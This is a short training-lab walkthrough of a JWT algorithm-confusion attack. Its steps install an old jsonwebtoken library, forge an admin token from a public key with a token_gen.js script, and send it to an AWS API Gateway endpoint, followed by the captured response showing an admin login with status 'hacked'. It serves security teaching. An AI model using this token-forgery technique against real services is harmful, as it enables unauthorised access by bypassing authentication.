## Algorithm Confussion

* SSH into the server given to you
* Run: `cd /root/serverless-training-apps/jwt_example`
* Run: `npm install -s jsonwebtoken@4.2.0 colors`
* Run `node token_gen.js --file public_key.pem --username admin`
* Copy the token after the characters `This is your token: `
* Run `http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:<copied token>`

    ```commandline
    root@we45-VirtualBox:/home/we45# http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoiaGFja2VkIiwiaWF0IjoxNTM3ODgwMjg2fQ.29E-i4QD21pvpA41oEJx60haJoOpgqbpzbvE6OK-Exg
    HTTP/1.1 200 OK
    Access-Control-Allow-Credentials: true
    Access-Control-Allow-Headers: Content-Type,Authorization,X-Amz-Date,X-Api-Key,X-Amz-Security-Token
    Access-Control-Allow-Methods: GET,OPTIONS
    Access-Control-Allow-Origin: *
    Access-Control-Max-Age: 0
    Connection: keep-alive
    Content-Length: 114
    Content-Type: application/json
    Date: Tue, 25 Sep 2018 17:12:14 GMT
    Via: 1.1 5bc1c4711561ec9e65e05f2ef18f000a.cloudfront.net (CloudFront)
    X-Amz-Cf-Id: JquwGQ1bb1vr5ev4oFF6R8e5MqbzM-YqyVvEJJKaz7fPN0nRlly3rw==
    X-Amzn-Trace-Id: Root=1-5baa6c6d-a196d3961775849ef9a9ffc4;Sampled=1
    X-Cache: Miss from cloudfront
    X-Success-Request: true
    x-amz-apigw-id: NyXhKFUHoAMFscA=
    x-amzn-RequestId: 25718e25-c0e6-11e8-86e5-dddb808cd601
    
    {
        "decoded": {
            "iat": 1537880286, 
            "status": "hacked", 
            "username": "admin"
        }, 
        "success": "You are successfully authenticated"
    }
    
    ```
